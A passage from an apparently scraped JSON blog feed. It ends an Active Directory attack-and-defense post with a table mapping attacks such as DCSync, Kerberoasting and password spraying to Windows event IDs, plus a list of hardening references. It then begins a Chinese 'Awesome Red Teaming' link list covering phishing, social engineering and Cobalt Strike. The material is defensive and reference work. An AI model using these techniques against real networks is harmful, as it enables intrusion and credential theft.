removed</td>\n</tr>\n<tr>\n<td>Skeleton Keys</td>\n<td>4673: A privileged service was called<br>4611: A trusted logon process has been registered with the Local Security Authority<br>4688: A new process has been created<br>4689: A new process has exited</td>\n</tr>\n<tr>\n<td>PYKEK MS14-068</td>\n<td>4672: Admin Logon<br>4624: Account Logon<br>4768: Kerberos TGS Request</td>\n</tr>\n<tr>\n<td>Kerberoasting</td>\n<td>4769: A Kerberos ticket was requested</td>\n</tr>\n<tr>\n<td>S4U2Proxy</td>\n<td>4769: A Kerberos ticket was requested</td>\n</tr>\n<tr>\n<td>Lateral Movement</td>\n<td>4688: A new process has been created<br>4689: A process has exited<br>4624: An account was successfully logged on<br>4625: An account failed to log on</td>\n</tr>\n<tr>\n<td>DNSAdmin</td>\n<td>770: DNS Server plugin DLL has been loaded<br>541: The setting serverlevelplugindll on scope . has been set to  <code>&lt;dll path&gt;</code> <br>150: DNS Server could not load or initialize the plug-in DLL</td>\n</tr>\n<tr>\n<td>DCSync</td>\n<td>4662: An operation was performed on an object</td>\n</tr>\n<tr>\n<td>Password Spraying</td>\n<td>4625: An account failed to log on<br>4771: Kerberos pre-authentication failed<br>4648: A logon was attempted using explicit credentials</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"resources\"><a class=\"anchor\" href=\"#resources\">#</a> Resources</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMvaGVscC80NTU3MjIyL2hvdy10by1tYW5hZ2UtdGhlLWNoYW5nZXMtaW4tbmV0bG9nb24tc2VjdXJlLWNoYW5uZWwtY29ubmVjdGlvbnMtYXNzb2M=\">How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaHViLnRyaW1hcmNzZWN1cml0eS5jb20vcG9zdC9zZWN1cmluZy1hY3RpdmUtZGlyZWN0b3J5LXBlcmZvcm1pbmctYW4tYWN0aXZlLWRpcmVjdG9yeS1zZWN1cml0eS1yZXZpZXc=\">Securing Active Directory: Performing an Active Directory Security Review</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2VydC5zc2kuZ291di5mci91cGxvYWRzL2d1aWRlLWFkLmh0bWw=\">ACTIVE DIRECTORY SECURITY ASSESSMENT CHECKLIST</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hY3NjLmdvdi5hdS9wdWJsaWNhdGlvbnMvTWl0aWdhdGlvbl9TdHJhdGVnaWVzXzIwMTcucGRm\">ASD Strategies to Mitigate Cyber Security Incidents</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZHMvcGxhbi9zZWN1cml0eS1iZXN0LXByYWN0aWNlcy9yZWR1Y2luZy10aGUtYWN0aXZlLWRpcmVjdG9yeS1hdHRhY2stc3VyZmFjZQ==\">Reducing the Active Directory Attack Surface</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNoY29tbXVuaXR5Lm1pY3Jvc29mdC5jb20vdDUvUHJlbWllci1GaWVsZC1FbmdpbmVlcmluZy9DaGFuZ2VzLXRvLVRpY2tldC1HcmFudGluZy1UaWNrZXQtVEdULURlbGVnYXRpb24tQWNyb3NzLVRydXN0cy9iYS1wLzQ0MDI4Mw==\">Changes to Ticket-Granting Ticket (TGT) Delegation Across Trusts in Windows Server (AskPFEPlat edition)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLXVzL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0FEVjE5MDAwNg==\">ADV190006 | Guidance to mitigate unconstrained delegation vulnerabilities</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0FEVjE5MDAyMw==\">ADV190023 | Microsoft Guidance for Enabling LDAP Channel Binding and LDAP Signing</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb2NpYWwudGVjaG5ldC5taWNyb3NvZnQuY29tL3dpa2kvY29udGVudHMvYXJ0aWNsZXMvMjA5NjQuYWN0aXZlLWRpcmVjdG9yeS11bHRpbWF0ZS1yZWFkaW5nLWNvbGxlY3Rpb24uYXNweA==\">Active Directory: Ultimate Reading Collection</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb2NpYWwudGVjaG5ldC5taWNyb3NvZnQuY29tL3dpa2kvY29udGVudHMvYXJ0aWNsZXMvMTg5MzEuc2VjdXJpdHktaGFyZGVuaW5nLXRpcHMtYW5kLXJlY29tbWVuZGF0aW9ucy5hc3B4\">Security Hardening Tips and Recommendations</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zMzc3\">Securing Domain Controllers to Improve Active Directory Security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zMjk5\">Securing Windows Workstations: Developing a Secure Baseline</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZHMvcGxhbi9zZWN1cml0eS1iZXN0LXByYWN0aWNlcy9pbXBsZW1lbnRpbmctc2VjdXJlLWFkbWluaXN0cmF0aXZlLWhvc3Rz\">Implementing Secure Administrative Hosts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvbWljcm9zb2Z0LWlkZW50aXR5LW1hbmFnZXIvcGFtL3ByaXZpbGVnZWQtaWRlbnRpdHktbWFuYWdlbWVudC1mb3ItYWN0aXZlLWRpcmVjdG9yeS1kb21haW4tc2VydmljZXM=\">Privileged Access Management for Active Directory Domain Services</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BhdWxTZWMvYXdlc29tZS13aW5kb3dzLWRvbWFpbi1oYXJkZW5pbmc=\">Awesome Windows Domain Hardening</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZHMvcGxhbi9zZWN1cml0eS1iZXN0LXByYWN0aWNlcy9iZXN0LXByYWN0aWNlcy1mb3Itc2VjdXJpbmctYWN0aXZlLWRpcmVjdG9yeQ==\">Best Practices for Securing Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2ludHJvZHVjaW5nLXRoZS1hZHZlcnNhcnktcmVzaWxpZW5jZS1tZXRob2RvbG9neS1wYXJ0LW9uZS1lMzhlMDZmZmQ2MDQ=\">Introducing the Adversary Resilience Methodology — Part One</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2ludHJvZHVjaW5nLXRoZS1hZHZlcnNhcnktcmVzaWxpZW5jZS1tZXRob2RvbG9neS1wYXJ0LXR3by0yNzlhMWVkNzg2M2Q=\">Introducing the Adversary Resilience Methodology — Part Two</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC5taWNyb3NvZnQuY29tL2Rvd25sb2FkLzcvNy9BLzc3QUJDNUJELTgzMjAtNDFBRi04NjNDLTZFQ0ZCMTBDQjRCOS9NaXRpZ2F0aW5nLVBhc3MtdGhlLUhhc2gtQXR0YWNrcy1hbmQtT3RoZXItQ3JlZGVudGlhbC1UaGVmdC1WZXJzaW9uLTIucGRm\">Mitigating Pass-the-Hash and Other Credential Theft, version 2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25zYWN5YmVyL1dpbmRvd3MtU2VjdXJlLUhvc3QtQmFzZWxpbmU=\">Configuration guidance for implementing the Windows 10 and Windows Server 2016 DoD Secure Host Baseline settings</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZHMvcGxhbi9zZWN1cml0eS1iZXN0LXByYWN0aWNlcy9tb25pdG9yaW5nLWFjdGl2ZS1kaXJlY3RvcnktZm9yLXNpZ25zLW9mLWNvbXByb21pc2U=\">Monitoring Active Directory for Signs of Compromise</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuanBjZXJ0Lm9yLmpwL2VuZ2xpc2gvcHViL3NyL0RldGVjdGluZyUyMExhdGVyYWwlMjBNb3ZlbWVudCUyMHRocm91Z2glMjBUcmFja2luZyUyMEV2ZW50JTIwTG9nc192ZXJzaW9uMi5wZGY=\">Detecting Lateral Movement through Tracking Event Logs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZXJ0LmV1cm9wYS5ldS9zdGF0aWMvV2hpdGVQYXBlcnMvVVBEQVRFRCUyMC0lMjBDRVJULUVVX1NlY3VyaXR5X1doaXRlcGFwZXJfMjAxNC0wMDdfS2VyYmVyb3NfR29sZGVuX1RpY2tldF9Qcm90ZWN0aW9uX3YxXzQucGRm\">Kerberos Golden Ticket Protection Mitigating Pass-the-Ticket on Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaWdpdGFsLWZvcmVuc2ljcy5zYW5zLm9yZy9ibG9nLzIwMTMvMDYvMjAvb3ZlcnZpZXctb2YtbWljcm9zb2Z0cy1iZXN0LXByYWN0aWNlcy1mb3Itc2VjdXJpbmctYWN0aXZlLWRpcmVjdG9yeQ==\">Overview of Microsoft's &quot;Best Practices for Securing Active Directory&quot;</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kc2ltZy51Ym0tdXMubmV0L2VudmVsb3BlLzE1NTQyMi8zMTQyMDIvMTMzMDUzNzkxMl9LZXlzX3RvX3RoZV9LaW5nZG9tX0xpbWl0aW5nX0FEX0FkbWlucy5wZGY=\">The Keys to the Kingdom: Limiting Active Directory Administrators</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy5zYW5zLm9yZy9jeWJlci1kZWZlbnNlLzIwMTgvMDkvMTAvcHJvdGVjdC1wcml2aWxlZ2VkLWFkLWFjY291bnRzLXdpdGgtZml2ZS1mcmVlLWNvbnRyb2xzLw==\">Protect Privileged AD Accounts With Five Free Controls</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNjg0\">The Most Common Active Directory Security Issues and What You Can Do to Fix Them</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25zYWN5YmVyL0V2ZW50LUZvcndhcmRpbmctR3VpZGFuY2U=\">Event Forwarding Guidance</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubXdyaW5mb3NlY3VyaXR5LmNvbS9vdXItdGhpbmtpbmcvcGxhbnRpbmctdGhlLXJlZC1mb3Jlc3QtaW1wcm92aW5nLWFkLW9uLXRoZS1yb2FkLXRvLWVzYWUv\">Planting the Red Forest: Improving AD on the Road to ESAE</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zNDU4\">Detecting Kerberoasting Activity</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vcHQtcHQvcHJldmlvdXMtdmVyc2lvbnMvd2luZG93cy9zZXJ2ZXIvY2M3NTUzMjEodj13cy4xMCk=\">Security Considerations for Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvYWR2YW5jZWQtdGhyZWF0LWFuYWx5dGljcy9zdXNwaWNpb3VzLWFjdGl2aXR5LWd1aWRl\">Advanced Threat Analytics suspicious activity guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZXJ0LmV1cm9wYS5ldS9zdGF0aWMvV2hpdGVQYXBlcnMvQ0VSVC1FVS1TV1BfMTRfMDdfUGFzc1RoZUdvbGRlbl9UaWNrZXRfdjFfMS5wZGY=\">Protection from Kerberos Golden Ticket</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC5taWNyb3NvZnQuY29tL2Rvd25sb2FkL0MvMS80L0MxNDU3OUNBLUU1NjQtNDc0My04QjUxLTYxQzA4ODI2NjJBQy9XaW5kb3dzJTIwMTAlMjBjcmVkZW50aWFsJTIwdGhlZnQlMjBtaXRpZ2F0aW9uJTIwZ3VpZGUuZG9jeA==\">Windows 10 Credential Theft Mitigation Guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmphdmVsaW4tbmV0d29ya3MuY29tL2RldGVjdGluZy1wYXNzLXRoZS10aWNrZXQtYW5kLXBhc3MtdGhlLWhhc2gtYXR0YWNrLXVzaW5nLXNpbXBsZS13bWktY29tbWFuZHMtMmM0NjEwMmI3NmJj\">Detecting Pass-The- Ticket and Pass-The- Hash Attack Using Simple WMI Commands</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9TdGVwLWJ5LVN0ZXAtRGVwbG95LUxvY2FsLTdjOWVmNzcy\">Step by Step Deploy Microsoft Local Administrator Password Solution</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJvb3BlcnMuZGUvZG93bmxvYWRzL3Ryb29wZXJzMTcvVFIxN19BRF9zaWduZWQucGRm\">Active Directory Security Best Practices</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy50ZWNobmV0Lm1pY3Jvc29mdC5jb20vam9uc2gvMjAxOC8xMC8wMy9maW5hbGx5LWRlcGxveS1hbmQtYXVkaXQtbGFwcy13aXRoLXByb2plY3QtdmFzdC1wYXJ0LTEtb2YtMi8=\">Finally Deploy and Audit LAPS with Project VAST, Part 1 of 2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudWx0aW1hdGV3aW5kb3dzc2VjdXJpdHkuY29tL3NlY3VyaXR5bG9nL2VuY3ljbG9wZWRpYS9kZWZhdWx0LmFzcHg=\">Windows Security Log Events</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJpbWFyY3NlY3VyaXR5LmNvbS9zaW5nbGUtcG9zdC9EZXRlY3RpbmctdGhlLUVsdXNpdmUtQWN0aXZlLURpcmVjdG9yeS1UaHJlYXQtSHVudGluZw==\">Talk Transcript BSidesCharm Detecting the Elusive: Active Directory Threat Hunting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2JsdWUtdGVhbS9wcmV2ZW50aW5nLW1pbWlrYXR6LWF0dGFja3MtZWQyODNlN2ViZGQ1\">Preventing Mimikatz Attacks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvUXVlc3RTb2Z0d2FyZS91bmRlcnN0YW5kaW5nLXJlZC1mb3Jlc3QtdGhlLTN0aWVyLWVzYWUtYW5kLWFsdGVybmF0aXZlLXdheXMtdG8tcHJvdGVjdC1wcml2aWxlZ2VkLWNyZWRlbnRpYWxz\">Understanding &quot;Red Forest&quot; - The 3-Tier ESAE and Alternative Ways to Protect Privileged Credentials</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zNzgy\">Securing Microsoft Active Directory Federation Server (ADFS)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9taWNyb3NvZnQtMzY1L2Jsb2cvMjAxOC8wMy8wNS9henVyZS1hZC1hbmQtYWRmcy1iZXN0LXByYWN0aWNlcy1kZWZlbmRpbmctYWdhaW5zdC1wYXNzd29yZC1zcHJheS1hdHRhY2tzLw==\">Azure AD and ADFS best practices: Defending against password spray attacks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMg==\">AD Reading: Active Directory Backup and Disaster Recovery</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZW5kZ2FtZS5jb20vYmxvZy90ZWNobmljYWwtYmxvZy90ZW4tcHJvY2Vzcy1pbmplY3Rpb24tdGVjaG5pcXVlcy10ZWNobmljYWwtc3VydmV5LWNvbW1vbi1hbmQtdHJlbmRpbmctcHJvY2Vzcw==\">Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZW5kZ2FtZS5jb20vYmxvZy90ZWNobmljYWwtYmxvZy9odW50aW5nLW1lbW9yeS1uZXQtYXR0YWNrcw==\">Hunting For In-Memory .NET Attacks</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2Fucy5vcmcvcmVhZGluZy1yb29tL3doaXRlcGFwZXJzL2RldGVjdGlvbi9taW1pa2F0ei1vdmVydmlldy1kZWZlbnNlcy1kZXRlY3Rpb24tMzY3ODA=\">Mimikatz Overview, Defenses and Detection</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJpbWFyY3NlY3VyaXR5LmNvbS9zaW5nbGUtcG9zdC8yMDE4LzA1LzA2L1RyaW1hcmMtUmVzZWFyY2gtRGV0ZWN0aW5nLVBhc3N3b3JkLVNwcmF5aW5nLXdpdGgtU2VjdXJpdHktRXZlbnQtQXVkaXRpbmc=\">Trimarc Research: Detecting Password Spraying with Security Event Auditing</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY291bnRlcmNlcHQuY29tL2Jsb2cvaHVudGluZy1mb3ItZ2FyZ295bGUv\">Hunting for Gargoyle Memory Scanning Evasion</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy9zZWN1cml0eS90aHJlYXQtcHJvdGVjdGlvbi93aW5kb3dzLWRlZmVuZGVyLWFwcGxpY2F0aW9uLWNvbnRyb2wvd2luZG93cy1kZWZlbmRlci1hcHBsaWNhdGlvbi1jb250cm9sLWRlcGxveW1lbnQtZ3VpZGU=\">Planning and getting started on the Windows Defender Application Control deployment process</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL3RoaW5rLXN0YWNrL3ByZXZlbnRpbmctbGF0ZXJhbC1tb3ZlbWVudC11c2luZy1uZXR3b3JrLWFjY2Vzcy1ncm91cHMtN2U4ZDUzOWE5MDI5\">Preventing Lateral Movement Using Network Access Groups</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9vbmVkcml2ZS5saXZlLmNvbS92aWV3LmFzcHg/cmVzaWQ9RDAyNkI0Njk5MTkwRjFFNiEyODQzJmFtcDtpdGhpbnQ9ZmlsZSUyY3BwdHgmYW1wO2FwcD1Qb3dlclBvaW50JmFtcDthdXRoa2V5PSFBTXZDUlRLQl9WMUo1b3c=\">How to Go from Responding to Hunting with Sysinternals Sysmon</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BhbGFudGlyL3dpbmRvd3MtZXZlbnQtZm9yd2FyZGluZw==\">Windows Event Forwarding Guidance</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3RocmVhdGV4cHJlc3MuY29tLzIwMTgvMDUvdGhyZWF0LW1pdGlnYXRpb24tc3RyYXRlZ2llcy10ZWNobmljYWwtcmVjb21tZW5kYXRpb25zLWFuZC1pbmZvLXBhcnQtMi8=\">Threat Mitigation Strategies: Part 2 – Technical Recommendations and Information</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGFubmVsOS5tc2RuLmNvbS9FdmVudHMvSWduaXRlLzIwMTUvQlJLMzQ4Ng==\">Modern Hardening: Lessons Learned on Hardening Applications and Services</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3B1YmxpY2F0aW9ucy5nYy5jYS9jb2xsZWN0aW9ucy9jb2xsZWN0aW9uXzIwMTkvY3N0Yy1jc2VjL0Q5Ny0zLTcwLTEyLTIwMTktZW5nLnBkZg==\">ITSP.70.012 Guidance for Hardening Microsoft Windows 10 Enterprise</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc25lYWt5bW9ua2V5Lm5ldC8yMDE4LzA2LzI1L2JsdWUtdGVhbS10aXBzLw==\">Blue Team Tips</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3RpZ3ZpZXdlci5jb20vc3RpZy9hY3RpdmVfZGlyZWN0b3J5X2RvbWFpbi8=\">Active Directory Domain Security Technical Implementation Guide (STIG)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvSHV5S2hhMi9hZHN0Zy12MjAtZ3VpZGFuY2U=\">Active Directory Security Testing Guide - v2.0</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZnMvZGVwbG95bWVudC9iZXN0LXByYWN0aWNlcy1zZWN1cmluZy1hZC1mcw==\">Best practices for securing Active Directory Federation Services</span></li>\n</ul>\n<h2 id=\"license\"><a class=\"anchor\" href=\"#license\">#</a> License</h2>\n<p><a href=\"http://creativecommons.org/publicdomain/zero/1.0\"><img data-src=\"http://mirrors.creativecommons.org/presskit/buttons/88x31/svg/cc-zero.svg\" alt=\"CC0\" /></a></p>\n<p>To the extent possible under law, Rahmat Nurfauzi &quot;@infosecn1nja&quot; has waived all copyright and related or neighboring rights to this work.</p>\n",
            "tags": [
                "网络安全",
                "AD-Attack-Defense"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/18/Awesome-Red-Teaming/",
            "url": "https://self-ferry.github.io/2021/01/18/Awesome-Red-Teaming/",
            "title": "Awesome Red Teaming【转】",
            "date_published": "2021-01-18T07:02:37.000Z",
            "content_html": "<h1 id=\"awesome-red-teaming\"><a class=\"anchor\" href=\"#awesome-red-teaming\">#</a> Awesome Red Teaming</h1>\n<p>一个最好的红队资源清单</p>\n<p>此列表同样适用于希望了解红队但没有相关知识储备的人</p>\n<p>无论如何，这是一个活跃的列表，会定期更新最新的对抗策略与技术</p>\n<p>你可以通过发起 PR 来添加更多有用信息！</p>\n<h1 id=\"目录\"><a class=\"anchor\" href=\"#目录\">#</a> 目录</h1>\n<ul>\n<li><a href=\"#%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B\">社会工程</a></li>\n<li><a href=\"#-osint\">OSINT</a></li>\n<li><a href=\"#%E6%8A%95%E9%80%92\">投递</a></li>\n<li><a href=\"#%E6%A4%8D%E5%85%A5\">植入</a></li>\n<li><a href=\"#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8\">横向移动</a></li>\n<li><a href=\"#%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6\">命令控制</a></li>\n<li><a href=\"#%E5%B5%8C%E5%85%A5%E5%BC%8F%E4%B8%8E%E7%89%A9%E7%90%86%E8%AE%BE%E5%A4%87\">嵌入式与物理设备</a></li>\n<li><a href=\"#%E6%9D%82%E9%A1%B9\">杂项</a></li>\n<li><a href=\"#%E7%94%B5%E5%AD%90%E4%B9%A6%E7%B1%8D\">电子书籍</a></li>\n<li><a href=\"#%E5%9F%B9%E8%AE%AD\">培训</a></li>\n<li><a href=\"#%E8%AE%A4%E8%AF%81\">认证</a></li>\n</ul>\n<h2 id=\"\"><a class=\"anchor\" href=\"#\">#</a> <a href=\"#table-of-contents\">↑</a> 社会工程</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc29jaWFsLWVuZ2luZWVyLm9yZy8=\">社会工程门户网站</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5kYXJrcmVhZGluZy5jb20vdGhlLTctYmVzdC1zb2NpYWwtZW5naW5lZXJpbmctYXR0YWNrcy1ldmVyL2QvZC1pZC8xMzE5NDEx\">7 个最好的社会工程攻击案例</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnNhY29uZmVyZW5jZS5jb20vd3JpdGFibGUvcHJlc2VudGF0aW9ucy9maWxlX3VwbG9hZC9kYXMtMzAxX3dpbGxpYW1zX3JhZGVyLnBkZg==\">在大数据中使用社会工程策略 - RSA Conference Europe 2012</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5kZWZjb24ub3JnL0RFRiUyMENPTiUyMDI0L0RFRiUyMENPTiUyMDI0JTIwcHJlc2VudGF0aW9ucy9ERUZDT04tMjQtU2V5bW91ci1UdWxseS1XZWFwb25pemluZy1EYXRhLVNjaWVuY2UtRm9yLVNvY2lhbC1FbmdpbmVlcmluZy1XUC5wZGY=\">为社会工程武装数据科学：Twitter 中的自动 E2E 鱼叉式网络钓鱼 - Defcon 23</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2ltYWdlcy81LzU0L1ByZXNlbnRhdGlvbl9Tb2NpYWxfRW5naW5lZXJpbmcucGRm\">OWASP 社会工程介绍 - OWASP</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkdGVhbXNlY3VyZS5jb20vdXNiLWRyb3AtYXR0YWNrcy10aGUtZGFuZ2VyLW9mLWxvc3QtYW5kLWZvdW5kLXRodW1iLWRyaXZlcy8=\">USB 丢失攻击：USB 设备丢失与发现的危险</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JlZHRlYW1zZWN1cml0eS9QeVBoaXNoaW5n\">PyPhishing 工具包</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb3NjaGVkdWxlLmNvbS9ibG9nL2Jlc3QtdGltZS10by1zZW5kLWVtYWlsLw==\">发送电子邮件的最佳时间</span></li>\n</ul>\n<h2 id=\"-2\"><a class=\"anchor\" href=\"#-2\">#</a> <a href=\"#table-of-contents\">↑</a> OSINT</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ppdm9pL2F3ZXNvbWUtb3NpbnQ=\">最好的 OSINT 列表</span> - 覆盖了很多 OSINT 资源</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wNy9yZWNvbm5haXNzYW5jZS11c2luZy1saW5rZWRpbnQv\">使用 LinkedInt 进行侦察</span></li>\n</ul>\n<h2 id=\"-3\"><a class=\"anchor\" href=\"#-3\">#</a> <a href=\"#table-of-contents\">↑</a> 投递</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS9oZWxwLXNwZWFyLXBoaXNo\">Cobalt Strike - 鱼叉式网络钓鱼文档</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNC8xMi8xNy93aGF0cy10aGUtZ28tdG8tcGhpc2hpbmctdGVjaG5pcXVlLW9yLWV4cGxvaXQv\">Cobalt Strike - 什么是钓鱼？如何利用？</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1WN1VKalZjcTJBbw==\">使用 Cobalt Strike 进行网络钓鱼 - Raphael Mudge</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbmlnbWEweDMubmV0LzIwMTcvMDcvMTMvcGhpc2hpbmctYWdhaW5zdC1wcm90ZWN0ZWQtdmlldy8=\">针对受保护的视图进行钓鱼</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTUvMDYvdmVpbC1ldmFzaW9uLWFlcy1lbmNyeXB0ZWQtaHR0cGtleS1yZXF1ZXN0LW1vZHVsZS8=\">VEIL-EVASION 的 AES 加密 HTTPKEY 请求：沙盒逃逸</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcnN5bmRpY2F0ZXMuY29tLzIwMTYvMTIvZWdyZXNzaW5nLWJsdWVjb2F0LXdpdGgtY29iYWx0c3Rpa2UtbGV0c2VuY3J5cHQv\">EGRESSING BLUECOAT WITH COBALTSTIKE &amp; LET'S ENCRYPT</span></li>\n<li><span class=\"exturl\" 